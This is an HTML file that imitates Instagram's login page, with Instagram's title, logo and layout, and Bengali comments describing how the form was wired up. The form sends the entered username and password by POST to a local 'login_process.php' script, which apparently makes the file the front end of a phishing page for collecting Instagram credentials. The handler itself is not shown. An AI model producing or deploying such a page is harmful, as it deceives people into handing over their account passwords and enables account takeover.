<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" type="image/x-icon" href="image/ss.png">
    <title>Instagram</title>
</head>
<body>
    <main>
        <div class="main-container">
            <!-- ফোনের ছবিটা শুধু বড় স্ক্রিনে দেখাবে -->
            <img src="image/IG.jpeg" alt="phone" class="phoneImg">
            
            <div class="right-side">
                <div class="form-div">
                    <!-- এখানে action ও method যোগ করা হয়েছে -->
                    <form action="login_process.php" method="POST">
                        <img class="instaLogo" src="image/instaLogo.png" alt="logo">
                        
                        <!-- name="username" ও name="password" যোগ করা হয়েছে -->
                        <input type="text" class="input" name="username" placeholder="Phone number, username, or email" required>
                        <input type="password" class="input" name="password" required placeholder="Password">
                        
                        <button class="login-btn" type="submit">Log In</button>
                        
                        <div class="or-container">
                            <div class="line"></div>
                            <p id="or">OR</p>
                            <div class="line"></div>
                        </div>
                        <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i> Log in with Facebook</a>
                        <a href="#" class="forgot-pass">Forgot password?</a>
                    </form>
                </div>
                <div class="sign-up">
                    <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
                </div>
            </div>
        </div>
    </main>
</body>
</html>
